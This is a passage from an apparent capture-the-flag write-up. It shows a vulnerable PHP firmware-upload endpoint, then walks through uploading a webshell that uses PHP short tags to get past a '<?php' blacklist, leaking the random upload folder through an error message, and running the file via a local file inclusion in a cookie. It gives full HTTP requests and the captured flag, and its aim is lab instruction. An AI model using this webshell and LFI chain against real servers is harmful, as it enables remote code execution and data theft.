				else if($segment == '..')
				{
					if($test == '..')
						$parts[] = $test;
	
					if($test == '..' || $test == '')
						$parts[] = $segment;
				}
				else
				{
					$parts[] = $test;
					$parts[] = $segment;
				}
			}
		}
		return implode('/', $parts);
	}
	public function update_api()
	{
		ini_set('display_errors', 1);
		ini_set('display_startup_errors', 1);
		error_reporting(E_ALL);

		$date =  date('Ymdhis');
		$basedir = "/app/private/firmware_updates";
		$path = $basedir . "/" . uniqid() . "-" . $date . "/";
		mkdir($path);
		$jsonArray = json_decode(file_get_contents('php://input'),true); 
		if($this->session->userdata("admin"))
		{
			if(sizeof($jsonArray) > 6)
			{ 
				$this->output->set_output("Too many files");
				return;
			}
			foreach($jsonArray as $key=>$value)
			{
				if($value != "0")
				{
					$data = explode(":", $value);
					if(count($data) != 2){
						$this->output->set_output( "Invalid format");
						return;
					}
					$decoded = base64_decode($data[1]);
					$filename = $data[0];
					if($decoded !== false)
					{
						$targetName = $path . $filename;

						if(!file_exists($targetName))
						{
							// only write to the firmware_updates folder
							$rp = $this->normalizePath($targetName);
							
							if(substr($rp, 0, strlen($basedir)) === $basedir)
							{
								// ok to write!
								// allow_url_include
								if(strlen($value) > 1000000)
								{
									$this->output->set_output( "Size too large for $targetName");
									return;
								}
								
								if($decoded !== false && $value != "0")
								{
									$data = explode(":", $value);
									$decoded = base64_decode($data[1]);
									$filename = $data[0];

									$lower = strtolower($decoded);
									if(str_contains($lower, "<?php") || str_contains($lower, "<? ") ){
										$this->output->set_output("Malicious code detected");
										return;
									}
									else{
										file_put_contents($rp, $decoded);
									}
									
								}
								else
								{
									$this->output->set_output( "Something went wrong");
								}
								
							}
							else
							{
								$this->output->set_output( "Access denied");
								return;
							}
							
						}
					}
					else
					{
						$this->output->set_output( "Something went wrong...");
						return;
					}
				}
				
				$targetName = $path;
			}
			$this->output->set_output("Configuration uploaded!");
		}
		else
		{
			$this->output->set_output( "Admin only...");
		}
	}


	
}
```

5. The goal is to upload a webshell now. The uploads are put in a random folder which is unknown to the user and outside of the web root. The only way to trigger the code is via the LFI, but then we need the folder name. You can leak the path by triggering the 'Size too large for' error, but you need a succesfully uploaded file as well. So the first file should be your webshell, and the second one a file that is too large. The first file will still get uploaded even if the error triggers. Note that the file can't be too large, or the NGINX max file size will trigger.
6. There's also a small anti-php blacklist here, but you can get around that by using PHP shorttags: `<?= system('cat /flag.txt')?>`
7. So make sure the format is correct for the submission ('filename:base64(payload)') and submit:

```
POST /index.php/admin/update_api HTTP/1.1
Host: localhost:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 69
Origin: http://localhost:9999
Connection: close
Referer: http://localhost:9999/index.php/admin/update
Cookie: _ga_3EL835QL4R=GS1.1.1614799094.12.1.1614799202.0; _ga=GA1.1.1442945349.1611053461; _ga_RZD5CL3CTB=GS1.1.1616610883.5.0.1616610888.0; cookieconsent_status=dismiss; lang=en; ci_session=8684f39da9514faed5c80cab35ae8f3a29b90621

["flag.php:PD89c3lzdGVtKCdjYXQgL2ZsYWcudHh0JykgPz4=","random:aaaaaaaa....aaaaaaaaaa",0,0,0,0]

RESPONSE

HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Wed, 31 Mar 2021 10:49:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.3
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: ci_session=8684f39da9514faed5c80cab35ae8f3a29b90621; expires=Wed, 31-Mar-2021 12:49:15 GMT; Max-Age=7200; path=/; HttpOnly
Content-Length: 84

Size too large for /app/private/firmware_updates/606453aba69b8-20210331104915/random

```
8. And finally include the file using the LFI, no need for the PHP filter anymore

```
GET /index.php/state/show HTTP/1.1
Host: localhost:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga_3EL835QL4R=GS1.1.1614799094.12.1.1614799202.0; _ga=GA1.1.1442945349.1611053461; _ga_RZD5CL3CTB=GS1.1.1616610883.5.0.1616610888.0; cookieconsent_status=dismiss; lang=/app/private/firmware_updates/606453aba69b8-20210331104915/flagplz; ci_session=7dade6d71021e264743f7b17026c70a38c34d91d
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

				
            
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>
CSCBE{Oh_PHP_Why_Are_You_So_Dirty?}
CSCBE{Oh_PHP_Why_Are_You_So_Dirty?}<div class="page-header">
            <h1>
<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  Undefined variable $statetitl
```